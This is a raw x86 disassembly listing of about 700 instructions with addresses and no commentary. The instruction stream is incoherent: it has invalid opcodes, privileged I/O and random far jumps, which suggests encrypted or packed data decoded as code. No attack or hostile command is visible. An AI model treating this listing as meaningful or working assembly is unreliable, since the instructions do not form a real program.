  41fb0a:	jb     0x41fb2c
  41fb0c:	dec    esi
  41fb0d:	stos   BYTE PTR es:[edi],al
  41fb0e:	jns    0x41fb43
  41fb10:	sub    eax,DWORD PTR [esi]
  41fb12:	sbb    BYTE PTR [esi+0x3a],bh
  41fb15:	add    esp,edx
  41fb17:	push   cs
  41fb18:	repnz xchg edx,eax
  41fb1a:	fs ss push ecx
  41fb1d:	push   eax
  41fb1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb1f:	add    BYTE PTR [ebx-0x33c9c8b8],0x1
  41fb26:	outs   dx,DWORD PTR ds:[esi]
  41fb27:	push   eax
  41fb28:	mov    eax,ds:0xb03da5ce
  41fb2d:	sub    esp,DWORD PTR [ecx+0x6391fcb0]
  41fb33:	xor    ebx,DWORD PTR [ecx+ebx*1-0x24]
  41fb37:	loope  0x41fae1
  41fb39:	push   ss
  41fb3a:	and    BYTE PTR [eax*8-0x651a63ae],cl
  41fb41:	(bad)
  41fb46:	stos   BYTE PTR es:[edi],al
  41fb47:	mov    esp,0x33a26638
  41fb4c:	fs ds std 
  41fb4f:	fs or  cl,al
  41fb52:	lock xchg esi,eax
  41fb54:	xchg   esp,eax
  41fb55:	xor    eax,0xf4965268
  41fb5a:	jge    0x41fafc
  41fb5c:	leave  
  41fb5d:	loopne 0x41fb0c
  41fb5f:	inc    esp
  41fb60:	outs   dx,BYTE PTR ds:[esi]
  41fb61:	push   0x470e427a
  41fb66:	retf   0x4a23
  41fb69:	and    ebp,DWORD PTR [ecx]
  41fb6b:	fsubr  DWORD PTR [ebx-0x3e63b3a6]
  41fb71:	lods   al,BYTE PTR ds:[esi]
  41fb72:	scas   eax,DWORD PTR es:[edi]
  41fb73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb74:	adc    BYTE PTR [ebx+0xa],dh
  41fb77:	sub    al,0x6a
  41fb79:	sub    BYTE PTR [esi+0x69878713],0xe
  41fb80:	out    dx,eax
  41fb81:	fistp  DWORD PTR [ecx-0xb6385e5]
  41fb87:	sub    BYTE PTR [esi*2+0x6ce4c208],ch
  41fb8e:	jecxz  0x41fbd1
  41fb90:	in     eax,0x74
  41fb92:	int    0x9
  41fb94:	fst    QWORD PTR [esp+ebp*4+0x29]
  41fb98:	sub    edx,DWORD PTR ds:0xca1bff24
  41fb9e:	std    
  41fb9f:	sti    
  41fba0:	push   edx
  41fba1:	xor    DWORD PTR [ebx-0x276f72d5],eax
  41fba7:	bound  edi,QWORD PTR [ebx]
  41fba9:	mov    al,ds:0xe39b6e19
  41fbae:	fs push ecx
  41fbb0:	jno    0x41fc2f
  41fbb2:	daa    
  41fbb3:	jle    0x41fbd4
  41fbb5:	call   0x4bbd:0x6bd96cf8
  41fbbc:	jmp    0x41fc06
  41fbbe:	scas   al,BYTE PTR es:[edi]
  41fbbf:	push   esp
  41fbc0:	pop    ecx
  41fbc1:	jp     0x41fbb9
  41fbc3:	xor    esi,DWORD PTR [esi+0x27]
  41fbc6:	jnp    0x41fbd4
  41fbc8:	or     al,0xbd
  41fbca:	inc    edx
  41fbcb:	sbb    eax,0x5d863d76
  41fbd0:	mov    ds:0x76e7e4f,al
  41fbd5:	sahf   
  41fbd6:	pop    ss
  41fbd7:	int    0x4f
  41fbd9:	retf   0xa1a4
  41fbdc:	inc    ebx
  41fbdd:	lock dec edx
  41fbdf:	jecxz  0x41fbd2
  41fbe1:	xchg   ebp,eax
  41fbe2:	mov    cl,BYTE PTR [esi+0x25a64c98]
  41fbe8:	test   eax,0x3cebf047
  41fbed:	gs out 0x3,eax
  41fbf0:	mov    ds:0x8cfd424e,al
  41fbf5:	ror    DWORD PTR [edi-0x1c4735f4],1
  41fbfb:	push   cs
  41fbfc:	in     eax,0x2b
  41fbfe:	nop
  41fbff:	pop    ecx
  41fc00:	fcomip st,st(1)
  41fc02:	fcomip st,st(7)
  41fc04:	push   0xc0710504
  41fc09:	hlt    
  41fc0a:	adc    bh,al
  41fc0c:	lods   al,BYTE PTR ds:[esi]
  41fc0d:	out    dx,al
  41fc0e:	mov    cl,BYTE PTR [ebx]
  41fc10:	mov    ebx,?
  41fc12:	out    dx,ax
  41fc14:	pop    edx
  41fc15:	mov    ds:0x4933341e,eax
  41fc1a:	sub    eax,0x2848e274
  41fc1f:	push   0xc19aea9d
  41fc24:	jne    0x41fbb4
  41fc26:	call   0x3cc608f3
  41fc2b:	sub    DWORD PTR [ebp+0x44e46bce],ebx
  41fc31:	cwde   
  41fc32:	add    BYTE PTR [esi+ebp*1+0x55],al
  41fc36:	rcl    edx,0x26
  41fc39:	jae    0x41fbc5
  41fc3b:	dec    esp
  41fc3c:	inc    eax
  41fc3d:	push   eax
  41fc3e:	int3   
  41fc3f:	or     ch,BYTE PTR [esi-0x185faa5b]
  41fc45:	jae    0x41fcc4
  41fc47:	xchg   ecx,eax
  41fc48:	jne    0x41fc43
  41fc4a:	cmp    edx,DWORD PTR [edi]
  41fc4c:	scas   eax,DWORD PTR es:[edi]
  41fc4d:	xchg   edx,eax
  41fc4e:	lds    esi,FWORD PTR [ebx-0x203fc916]
  41fc54:	push   0xa047acfb
  41fc59:	test   al,0xb2
  41fc5b:	mov    al,0x51
  41fc5d:	push   eax
  41fc5e:	scas   eax,DWORD PTR es:[edi]
  41fc5f:	adc    eax,0x931c42e
  41fc64:	add    al,BYTE PTR [esi+0x19aa9fd7]
  41fc6a:	sbb    DWORD PTR [edi+ebp*4],esi
  41fc6d:	and    edx,DWORD PTR [esi+0x3f]
  41fc70:	mov    al,0x2e
  41fc72:	stc    
  41fc73:	mov    ebp,0xbbb3c3f4
  41fc78:	ins    DWORD PTR es:[edi],dx
  41fc79:	fnstenv [esi]
  41fc7b:	gs mov ecx,0xa5b6f070
  41fc81:	xchg   ebp,eax
  41fc82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc83:	jmp    0xd05ecfbf
  41fc88:	sbb    eax,0x1856876f
  41fc8d:	mov    esi,0x18735422
  41fc92:	jle    0x41fc58
  41fc94:	xchg   ecx,eax
  41fc95:	jle    0x41fc8e
  41fc97:	stos   DWORD PTR es:[edi],eax
  41fc98:	rol    al,1
  41fc9a:	inc    eax
  41fc9b:	into   
  41fc9c:	mov    al,0x73
  41fc9e:	fwait
  41fc9f:	in     al,dx
  41fca0:	xor    BYTE PTR [edx+0x7e],bl
  41fca3:	sbb    eax,0x42b70371
  41fca8:	lea    edi,[edx]
  41fcaa:	lock fist DWORD PTR [eax+0x2]
  41fcae:	stos   DWORD PTR es:[edi],eax
  41fcaf:	inc    esp
  41fcb0:	repnz arpl si,ax
  41fcb3:	xchg   ebp,eax
  41fcb4:	xor    al,ah
  41fcb6:	adc    bh,dl
  41fcb8:	in     al,0x9f
  41fcba:	or     eax,DWORD PTR [eax+0x4dfa369b]
  41fcc0:	test   DWORD PTR [esi+0x41],ecx
  41fcc3:	das    
  41fcc4:	add    eax,0xb6218ea
  41fcc9:	sub    cl,BYTE PTR [ebx]
  41fccb:	sbb    ah,cl
  41fccd:	mov    edx,0x397768b0
  41fcd2:	fistp  QWORD PTR ds:0xc8c704e9
  41fcd8:	fnstcw WORD PTR [eax+0xa]
  41fcdb:	push   es
  41fcdc:	mov    eax,0x51f1171c
  41fce1:	dec    esi
  41fce2:	loop   0x41fc69
  41fce4:	dec    esi
  41fce5:	add    dh,bl
  41fce7:	inc    eax
  41fce8:	scas   eax,DWORD PTR es:[edi]
  41fce9:	(bad)  
  41fcea:	neg    ecx
  41fcec:	push   edi
  41fced:	shl    DWORD PTR [edi+0x6],1
  41fcf0:	loopne 0x41fc8a
  41fcf2:	push   cs
  41fcf3:	mov    bl,0x3a
  41fcf5:	xchg   bl,ch
  41fcf7:	test   DWORD PTR [ecx+0x59f1732],ebx
  41fcfd:	push   esp
  41fcfe:	pop    ecx
  41fcff:	sub    BYTE PTR [ecx],0xd3
  41fd02:	sub    ch,BYTE PTR [ebx-0x57]
  41fd05:	push   0xcf8cc84e
  41fd0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd0b:	inc    ecx
  41fd0c:	xor    cl,ch
  41fd0e:	pop    eax
  41fd0f:	rol    DWORD PTR [edi-0x80],cl
  41fd12:	inc    eax
  41fd13:	pop    eax
  41fd14:	or     BYTE PTR [ebx],0xa6
  41fd17:	cmp    ah,0x68
  41fd1a:	aad    0xa8
  41fd1c:	shr    DWORD PTR [ecx],1
  41fd1e:	push   esp
  41fd1f:	shl    DWORD PTR [ecx+0x48],0xe0
  41fd23:	add    dh,BYTE PTR [eax+eiz*1-0x395d8f88]
  41fd2a:	pop    esi
  41fd2b:	lock cwde 
  41fd2d:	popf   
  41fd2e:	mov    al,ds:0xa3ef3d0d
  41fd33:	mov    dl,0x7e
  41fd35:	and    bl,cl
  41fd37:	sub    al,0x58
  41fd39:	scas   eax,DWORD PTR es:[edi]
  41fd3a:	pusha  
  41fd3b:	scas   al,BYTE PTR es:[edi]
  41fd3c:	xchg   edi,eax
  41fd3d:	pop    edi
  41fd3e:	sub    edi,DWORD PTR [edi-0x20d921f9]
  41fd44:	mov    bl,BYTE PTR [eax-0x50192327]
  41fd4a:	fnstcw WORD PTR [edx]
  41fd4c:	push   esi
  41fd4d:	in     al,dx
  41fd4e:	jnp    0x41fcd1
  41fd50:	dec    ebp
  41fd51:	nop
  41fd52:	hlt    
  41fd53:	xchg   ebp,eax
  41fd54:	jg     0x41fd20
  41fd56:	dec    ecx
  41fd57:	xor    DWORD PTR [ebp+0x231426ac],ebx
  41fd5d:	sbb    dl,BYTE PTR [esi-0x650efcfd]
  41fd63:	and    eax,DWORD PTR [edi+eiz*4+0x67]
  41fd67:	mov    cl,0x2
  41fd69:	outs   dx,BYTE PTR ds:[esi]
  41fd6a:	dec    ecx
  41fd6b:	fdiv   QWORD PTR [edx-0x53]
  41fd6e:	jmp    0x41fdd1
  41fd70:	cli    
  41fd71:	lock sbb ah,BYTE PTR [ecx]
  41fd74:	sbb    DWORD PTR [esi-0x2f],0xffffffaf
  41fd78:	(bad)  
  41fd79:	pop    ss
  41fd7a:	sbb    DWORD PTR [ecx],esp
  41fd7c:	les    ebx,FWORD PTR ds:[ebx+ebp*4]
  41fd80:	push   0x2b49462b
  41fd85:	(bad)  
  41fd87:	sub    al,0x3b
  41fd89:	jnp    0x41fdc3
  41fd8b:	pop    ds
  41fd8c:	dec    ecx
  41fd8d:	adc    BYTE PTR [edx+ebp*1+0x10],dl
  41fd91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd93:	in     al,dx
  41fd94:	imul   ebx,esi,0x433f6cba
  41fd9a:	pop    eax
  41fd9b:	jp     0x41fdef
  41fd9d:	xor    eax,0x4e6af9f1
  41fda2:	icebp  
  41fda3:	ss add al,0xf7
  41fda6:	mov    ebp,0x241e60b9
  41fdab:	(bad)  
  41fdac:	fidivr DWORD PTR [edi]
  41fdae:	mov    dh,0x35
  41fdb0:	popf   
  41fdb1:	push   ebp
  41fdb2:	sub    eax,0x8ccd629d
  41fdb7:	stos   DWORD PTR es:[edi],eax
  41fdb8:	inc    esp
  41fdb9:	or     al,0xb8
  41fdbb:	jns    0x41fe19
  41fdbd:	das    
  41fdbe:	unpckhps xmm7,xmm6
  41fdc1:	cvtpi2ps xmm1,QWORD PTR [esi+0x7e]
  41fdc5:	rcl    BYTE PTR [edx],0x2f
  41fdc8:	sbb    edi,DWORD PTR [eax-0x6ed643de]
  41fdce:	das    
  41fdcf:	adc    BYTE PTR [ecx+0x77ba8f0f],0xe8
  41fdd6:	mov    esi,0x60ae8ebd
  41fddb:	loopne 0x41fd74
  41fddd:	xchg   ecx,eax
  41fdde:	xlat   BYTE PTR ds:[ebx]
  41fddf:	sbb    DWORD PTR [esi+0x2a],esi
  41fde2:	cmp    eax,0x51a81b8d
  41fde7:	xchg   ebp,eax
  41fde8:	jg     0x41fe1d
  41fdea:	(bad)  [edi]
  41fdec:	add    BYTE PTR [ecx+0x76adfd51],ch
  41fdf2:	inc    esp
  41fdf3:	mov    DWORD PTR [edi-0x79aeffae],ecx
  41fdf9:	xlat   BYTE PTR ds:[ebx]
  41fdfa:	mov    cl,0x64
  41fdfc:	fs dec ebp
  41fdfe:	jmp    0x4810e76
  41fe03:	aaa    
  41fe04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe05:	call   0x2e87:0xf47c4310
  41fe0c:	sub    edi,DWORD PTR [edx+0x234444cc]
  41fe12:	sbb    DWORD PTR [ecx+0x205cb4],0x3839ca7e
  41fe1c:	cmp    esi,DWORD PTR [ecx+0x67c943d4]
  41fe22:	(bad)  
  41fe23:	test   al,0xfe
  41fe25:	js     0x41fdf8
  41fe27:	lea    edi,[edx]
  41fe29:	sahf   
  41fe2a:	and    al,BYTE PTR ds:0x3ce20fe3
  41fe30:	and    esp,DWORD PTR [ecx+ebx*2-0x40eac6b7]
  41fe37:	leave  
  41fe38:	test   DWORD PTR [edi-0x133d0ba0],ebp
  41fe3e:	inc    ebx
  41fe3f:	call   0x57b7:0xb6ec9b9e
  41fe46:	pop    ds
  41fe47:	(bad)  
  41fe49:	adc    ch,BYTE PTR [ebx+0x74]
  41fe4c:	loop   0x41fe59
  41fe4e:	pop    ds
  41fe4f:	gs nop
  41fe51:	cmc    
  41fe52:	into   
  41fe53:	in     al,dx
  41fe54:	popf   
  41fe55:	adc    BYTE PTR ds:0x6abd1192,bh
  41fe5b:	adc    BYTE PTR [ebx+0x74],cl
  41fe5e:	xchg   ebp,eax
  41fe5f:	xor    eax,eax
  41fe61:	in     al,0x8c
  41fe63:	xchg   ebp,eax
  41fe64:	or     DWORD PTR [ecx-0x13],esp
  41fe67:	mov    al,ds:0x3bab0a1b
  41fe6c:	inc    ebx
  41fe6d:	nop
  41fe6e:	fcmovnu st,st(0)
  41fe70:	mov    cl,0x27
  41fe72:	cmp    esi,DWORD PTR [esi+0x3b]
  41fe75:	and    al,0xb
  41fe77:	and    DWORD PTR [eax],ecx
  41fe79:	inc    edi
  41fe7a:	popa   
  41fe7b:	add    ecx,DWORD PTR [edi]
  41fe7d:	sub    ebp,DWORD PTR [ebp+eiz*4+0x4b86f9fa]
  41fe84:	jb     0x41fe57
  41fe86:	enter  0x1ca6,0x80
  41fe8a:	mov    ds:0x89290d1f,eax
  41fe8f:	inc    ecx
  41fe90:	xlat   BYTE PTR ds:[ebx]
  41fe91:	mov    esp,0x7d00eb89
  41fe96:	in     al,dx
  41fe97:	jnp    0x41fe75
  41fe99:	data16 adc BYTE PTR [ebx],bl
  41fe9c:	hlt    
  41fe9d:	pop    ecx
  41fe9e:	mov    esp,0xd238f1b1
  41fea3:	fs call 0x3ac799e2
  41fea9:	or     edx,DWORD PTR [ebx]
  41feab:	hlt    
  41feac:	jle    0x41ff1b
  41feae:	addr16 fsincos 
  41feb1:	mov    al,ds:0x54dea004
  41feb6:	jns    0x41ff0d
  41feb8:	push   ebx
  41feb9:	xchg   edi,eax
  41feba:	scas   eax,DWORD PTR es:[edi]
  41febb:	sbb    eax,0x5d464c6f
  41fec0:	dec    eax
  41fec1:	mov    al,ds:0xf544b845
  41fec6:	sbb    al,0xfc
  41fec8:	and    dl,BYTE PTR [edx+0x26]
  41fecb:	popf   
  41fecc:	inc    esp
  41fecd:	xchg   esp,eax
  41fece:	cmp    dl,BYTE PTR [ebp+0x4aa02f28]
  41fed4:	pop    ebx
  41fed5:	enter  0xbb26,0x7b
  41fed9:	js     0x41ff1c
  41fedb:	xchg   ebx,eax
  41fedc:	add    ebx,DWORD PTR [ecx+0x2]
  41fedf:	cld    
  41fee0:	sub    al,0x6b
  41fee2:	dec    esp
  41fee3:	jg     0x41fece
  41fee5:	ftst   
  41fee7:	mov    bh,0x1d
  41fee9:	outs   dx,DWORD PTR ds:[esi]
  41feea:	dec    esp
  41feeb:	jmp    FWORD PTR [ecx]
  41feed:	jle    0x41fede
  41feef:	adc    dh,BYTE PTR [ecx+0x3cdf5f36]
  41fef5:	dec    ecx
  41fef6:	into   
  41fef7:	cmp    dh,al
  41fef9:	push   cs
  41fefa:	dec    ecx
  41fefb:	jmp    0x41feba
  41fefd:	dec    esp
  41fefe:	dec    edi
  41feff:	mov    eax,ds:0x960bd7b8
  41ff04:	xrelease xchg DWORD PTR [esi-0x2b],edx
  41ff08:	mul    bl
  41ff0a:	clc    
  41ff0b:	test   eax,0x81575f7c
  41ff10:	mov    ch,0x2d
  41ff12:	and    edi,DWORD PTR [edx+0x6b]
  41ff15:	int3   
  41ff16:	sbb    eax,0x7fd7237a
  41ff1b:	lea    eax,[ecx+0x246ff255]
  41ff21:	pop    eax
  41ff22:	jmp    0x2da:0x4a374495
  41ff29:	dec    esp
  41ff2a:	xchg   ebx,eax
  41ff2b:	sbb    DWORD PTR [ebx],ebx
  41ff2d:	adc    DWORD PTR [edx-0x6f],eax
  41ff30:	adc    BYTE PTR [ebx+ebx*8],bl
  41ff33:	add    ebp,edx
  41ff35:	fcom   DWORD PTR fs:[edi+0x1f26cd44]
  41ff3c:	repnz bound edx,QWORD PTR es:[esp+edx*4-0x57]
  41ff42:	cdq    
  41ff43:	imul   ebp,DWORD PTR ds:0xad5fe9e2,0x24edfe5c
  41ff4d:	mov    eax,ds:0xaba94aef
  41ff52:	bound  ecx,QWORD PTR [edx]
  41ff54:	scas   eax,DWORD PTR es:[edi]
  41ff55:	push   ebp
  41ff56:	push   ebx
  41ff57:	test   DWORD PTR [ecx-0x5dfec88],ecx
  41ff5d:	xor    eax,0x4571ce33
  41ff62:	xchg   edx,eax
  41ff63:	je     0x41fef7
  41ff65:	xchg   edi,eax
  41ff66:	mov    edx,0x30a30c25
  41ff6b:	adc    edx,DWORD PTR ds:[edi]
  41ff6e:	pop    ebp
  41ff6f:	lea    esp,[eax]
  41ff71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff73:	stos   BYTE PTR es:[edi],al
  41ff74:	les    edx,FWORD PTR [esi-0x7d]
  41ff77:	add    al,0x92
  41ff79:	sub    BYTE PTR [edi-0x5],bh
  41ff7c:	ret    0x23fe
  41ff7f:	or     dh,BYTE PTR [ebx+0x1e6b02fb]
  41ff85:	cli    
  41ff86:	out    0xe7,al
  41ff88:	icebp  
  41ff89:	and    eax,0xf2e3ca5d
  41ff8e:	dec    ebx
  41ff8f:	sbb    DWORD PTR [edx+0x4255c4bd],eax
  41ff95:	jle    0x41ffdc
  41ff97:	push   ebp
  41ff98:	or     eax,0xee0e0ae9
  41ff9d:	adc    eax,DWORD PTR [esp+ebp*1]
  41ffa0:	dec    eax
  41ffa1:	mov    bl,0xac
  41ffa3:	hlt    
  41ffa4:	jae    0x41ff67
  41ffa6:	es aas 
  41ffa8:	mov    ds:0x8cc9b6e,al
  41ffad:	test   edi,eax
  41ffaf:	mov    al,ds:0x71ea592f
  41ffb4:	mov    al,ds:0xade6f86f
  41ffb9:	int3   
  41ffba:	pop    es
  41ffbb:	mov    ebp,0xd4a27ba1
  41ffc0:	outs   dx,BYTE PTR ds:[esi]
  41ffc1:	loop   0x41ffcb
  41ffc3:	pop    ebp
  41ffc4:	aas    
  41ffc5:	mov    ah,0xf5
  41ffc7:	js     0x420028
  41ffc9:	bound  esi,QWORD PTR [ebx-0x66]
  41ffcc:	data16 xor BYTE PTR [ebx],0xaa
  41ffd0:	test   bl,ch
  41ffd2:	or     BYTE PTR [edi],ah
  41ffd4:	jle    0x41ff5b
  41ffd6:	pusha  
  41ffd7:	lock xacquire adc DWORD PTR [eax-0x3e1fbae9],esi
  41ffdf:	jmp    0x41ffb2
  41ffe1:	xchg   DWORD PTR [ebx],edx
  41ffe3:	daa    
  41ffe4:	mov    ds:0x3a160a26,eax
  41ffe9:	jo     0x42003b
  41ffeb:	out    0x19,eax
  41ffed:	jge    0x42006a
  41ffef:	pop    edi
  41fff0:	push   0xffffffb2
  41fff2:	in     eax,0x53
  41fff4:	adc    bh,BYTE PTR [eax+0x2d3eda84]
  41fffa:	nop
  41fffb:	repnz ds push cs
  41fffe:	ret    0xc8cf
  420001:	pop    es
  420002:	outs   dx,DWORD PTR ds:[esi]
  420003:	mov    ah,0x8e
  420005:	jno    0x42001f
  420007:	push   ebp
  420008:	(bad)  
  420009:	cdq    
  42000a:	call   0x18857fae
  42000f:	sbb    cl,BYTE PTR [eax]
  420011:	lahf   
  420012:	cmp    ch,dl
  420014:	lock icebp 
  420016:	fdiv   st(3),st
  420018:	xchg   dh,dh
  42001a:	mov    edx,0x3f70f62c
  42001f:	in     al,0xfa
  420021:	sbb    dh,BYTE PTR [eax-0x57]
  420024:	fsubp  st(4),st
  420026:	lahf   
  420027:	int    0x6b
  420029:	fnstsw WORD PTR [edx]
  42002b:	cmc    
  42002c:	enter  0xf313,0x5f
  420030:	stc    
  420031:	pop    ss
  420032:	test   eax,ecx
  420034:	jbe    0x42007a
  420036:	mov    ds:0x92c0e15a,eax
  42003b:	cmp    eax,0xfb242633
  420040:	and    cl,ch
  420042:	mov    edx,0x6015777e
  420047:	sub    DWORD PTR [esp+ebp*1-0x38],edi
  42004b:	pop    eax
  42004c:	sub    eax,0x21bec27a
  420051:	sbb    al,0xa2
  420053:	sub    dl,BYTE PTR [edx]
  420055:	cmp    BYTE PTR [eax+0x69],0x7f
  420059:	mov    al,0xfd
  42005b:	push   ds
  42005c:	jns    0x42004e
  42005e:	sbb    ebp,DWORD PTR [edi+0x31]
  420061:	push   0xa5519962
  420066:	aaa    
  420067:	mov    esp,0xc0229697
  42006c:	(bad)
  42006f:	jmp    0xc698:0xbc445484
  420076:	scas   eax,DWORD PTR es:[edi]
  420077:	cmp    dl,BYTE PTR [bx+si-0x8]
  42007b:	jmp    0xf980a1c7
  420080:	popa   
  420081:	sub    BYTE PTR [edx],cl
  420083:	and    eax,0xc592720d
  420088:	xlat   BYTE PTR ds:[ebx]
  420089:	imul   ebx,DWORD PTR [edx],0xc7b7e384
  42008f:	pop    ebx
  420090:	enter  0x614a,0x63
  420094:	mov    edi,0x74e45a91
  420099:	in     eax,dx
  42009a:	xor    BYTE PTR ds:0xd5b76a3,dl
  4200a0:	sbb    BYTE PTR [ebx],dh
  4200a2:	sub    BYTE PTR [ecx+0x63],al
  4200a5:	call   0x4a92:0x655264c
  4200ac:	pop    ecx
  4200ad:	ret    
  4200ae:	lods   al,BYTE PTR ds:[esi]
  4200af:	(bad)  
  4200b0:	cld    
  4200b1:	icebp  
  4200b2:	cmp    ecx,esp
  4200b4:	jle    0x4200ba
  4200b6:	or     al,BYTE PTR [ebx+0x1c2fe088]
  4200bc:	ins    DWORD PTR es:[edi],dx
  4200bd:	in     al,dx
  4200be:	jno    0x4200e2
  4200c0:	push   edx
  4200c1:	adc    cl,BYTE PTR [esi-0x18d0ed3f]
  4200c7:	add    al,BYTE PTR [esp+esi*1]
  4200ca:	cmp    al,0xf4
  4200cc:	sbb    BYTE PTR [ecx-0x40],ch
  4200cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200d0:	rcr    BYTE PTR [edx],1
  4200d2:	retf   0x98ae
  4200d5:	inc    esp
  4200d6:	icebp  
  4200d7:	out    0x8d,al
  4200d9:	js     0x420074
  4200db:	mov    bl,0x9a
  4200dd:	mov    al,ds:0x567378fc
  4200e2:	arpl   WORD PTR [ebx+0xc16af85],si
  4200e8:	mov    ebp,0x484a63f7
  4200ed:	out    dx,eax
  4200ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200ef:	repnz in al,0xb
  4200f2:	sub    ah,BYTE PTR [ecx+0x66]
  4200f5:	jmp    0x420174
  4200f7:	ss pushf 
  4200f9:	stos   DWORD PTR es:[edi],eax
  4200fa:	xor    eax,0x5f287a7b
  4200ff:	and    BYTE PTR [ebp-0x62503733],ah
  420105:	leave  
  420106:	jno    0x4200a8
  420108:	inc    dh
  42010a:	xor    DWORD PTR [esi-0x7c9c564b],edx
  420110:	rcl    BYTE PTR [edi+0x4b],0xb0
  420114:	mov    WORD PTR [ebp-0x63],gs
  420117:	push   es
  420118:	popa   
  420119:	int    0x48
  42011b:	hlt    
  42011c:	fld    QWORD PTR [eax]
  42011e:	clc    
  42011f:	je     0x420169
  420121:	xchg   BYTE PTR [esi+0x2d49dcda],al
  420127:	cmp    al,0x2b
  420129:	fist   WORD PTR [ebp-0xa8ab34d]
  42012f:	addr16 jb 0x4200d2
  420132:	ins    DWORD PTR es:[edi],dx
  420133:	loop   0x42015c
  420135:	dec    esp
  420136:	mov    ch,0xc7
  420138:	xor    DWORD PTR [ecx],eax
  42013a:	or     al,0x8
  42013c:	jp     0x42016b
  42013e:	jae    0x420129
  420140:	push   ebx
  420141:	sbb    DWORD PTR [ecx+0x4b53a2c],ebp
  420147:	retf   0xbb05
  42014a:	jnp    0x42011b
  42014c:	add    eax,0x1f87dca4
  420151:	mov    DWORD PTR [eax-0x6d],ecx
  420154:	sub    BYTE PTR [eax],dh
  420156:	xor    al,0x2
  420158:	mov    DWORD PTR [ebx],esi
  42015a:	adc    al,0xa9
  42015c:	add    al,0xb2
  42015e:	clc    
  42015f:	jle    0x42018e
  420161:	call   FWORD PTR [ebx+0x7b10123f]
  420167:	leave  
  420168:	pop    es
  420169:	ror    DWORD PTR [ebx],0xc5
  42016c:	pop    eax
  42016d:	and    dl,dl
  42016f:	jnp    0x4201d6
  420171:	mov    ds:0x1559493b,eax
  420176:	(bad)  
  420177:	adc    eax,0x2ff58ce1
  42017c:	in     al,dx
  42017d:	popf   
  42017e:	ret    
  42017f:	nop
  420180:	xor    al,0x9e
  420182:	cmp    eax,0x7425df93
  420187:	mov    cl,BYTE PTR [ecx+eiz*1-0x26]
  42018b:	imul   esi,DWORD PTR [ebp-0x78],0xffffff87
  42018f:	xchg   esp,eax
  420190:	jns    0x4201ae
  420192:	icebp  
  420193:	and    BYTE PTR [ecx-0x7297295f],al
  420199:	or     bl,al
  42019b:	icebp  
  42019c:	dec    edx
  42019d:	push   esi
  42019e:	push   edi
  42019f:	outs   dx,DWORD PTR ds:[esi]
  4201a0:	xlat   BYTE PTR ds:[ebx]
  4201a1:	shl    DWORD PTR [ecx-0x9b43aec],cl
  4201a7:	cmp    DWORD PTR [ecx+0x4e3d1c11],esi
  4201ad:	stc    
  4201ae:	or     al,0x5f
  4201b0:	mov    bl,0xdf
  4201b2:	nop
  4201b3:	add    eax,ecx
  4201b5:	aam    0x23
  4201b7:	popa   
  4201b8:	sbb    al,0xcb
  4201ba:	ror    DWORD PTR [ebp-0x36],0x20
  4201be:	push   edx
  4201bf:	mov    cl,0xd
  4201c1:	push   esp
  4201c2:	push   0x446a095e
  4201c7:	mov    al,0x86
  4201c9:	arpl   WORD PTR [ebx],dx
  4201cb:	mov    dl,BYTE PTR [edx-0x4b3d366]
  4201d1:	adc    ah,BYTE PTR [ecx-0x69380cb7]
  4201d7:	outs   dx,DWORD PTR ds:[esi]
  4201d8:	in     al,dx
  4201d9:	jo     0x4201af
  4201db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201dc:	shl    ch,1
  4201de:	and    dh,BYTE PTR [esi+eiz*1-0x7a]
  4201e2:	and    BYTE PTR [eax],cl
  4201e4:	call   0x63d2:0xcda389e0
  4201eb:	dec    ecx
  4201ec:	leave  
  4201ed:	push   esi
  4201ee:	jge    0x4201f5
  4201f0:	mov    esp,0xcf92fed4
  4201f5:	sti    
  4201f6:	mov    al,ds:0x97e72508
  4201fb:	jno    0x42022e
  4201fd:	repz push 0x5a68ae4d
  420203:	cmp    DWORD PTR [esi-0x2c5da660],esi
  420209:	push   cs
  42020a:	or     ah,BYTE PTR [ebx]
  42020c:	rcr    DWORD PTR [edx+ebp*8-0x2638ffa0],1
  420213:	rcr    BYTE PTR [edx+edx*2+0x21],1
  420217:	xor    cl,ah
  420219:	jb     0x4201a0
  42021b:	xor    al,0x59
  42021d:	sub    eax,0x11875e78
  420222:	xor    eax,0xc165f51e
  420227:	mov    DWORD PTR [edx],0xdebaf6bc
  42022d:	cli    
  42022e:	add    al,0x25
  420230:	xchg   ah,cl
  420232:	push   0xa953dea9
  420237:	sbb    dl,BYTE PTR [esi+edx*1-0x1d]
  42023b:	xchg   DWORD PTR [eax+ebx*1],ecx
  42023e:	pop    ecx
  42023f:	pop    edx
  420240:	cld    
  420241:	inc    ebx
  420242:	cmp    ecx,DWORD PTR [esi]
  420244:	daa    
  420245:	loopne 0x42024a
  420247:	mov    ah,0x6
  420249:	adc    eax,ebp
  42024b:	adc    ecx,DWORD PTR [edx-0x57]
  42024e:	(bad)  
  42024f:	imul   ebx,DWORD PTR [eax],0x44
  420252:	daa    
  420253:	mov    ss,WORD PTR [edi+ebp*1-0x1ebe9fd4]
  42025a:	int3   
  42025b:	(bad)  
  42025d:	(bad)  
  42025e:	or     al,0x17
  420260:	cli    
  420261:	ror    BYTE PTR [esi-0x50],cl
  420264:	xor    bl,BYTE PTR [esi+0x5daeacdb]
  42026a:	daa    
  42026b:	push   0x2679c6f8
  420270:	sub    al,0x17
  420272:	mov    ecx,0x90aaa97c
  420277:	aas    
  420278:	ins    BYTE PTR es:[edi],dx
  420279:	gs loopne 0x42029c
  42027c:	jae    0x42026a
  42027e:	jp     0x42027d
  420280:	xchg   esp,eax
  420281:	je     0x42024e
  420283:	and    al,0x90
  420285:	test   eax,0xf7f4951d
  42028a:	int3   
  42028b:	xor    al,0xf0
  42028d:	shr    BYTE PTR [ecx+0x54],0xa6
  420291:	pop    es
  420292:	push   eax
  420293:	jae    0x420223
  420295:	pusha  
  420296:	test   BYTE PTR [ecx+eax*8],ch
  420299:	push   edx
  42029a:	jb     0x420249
  42029c:	jne    0x420270
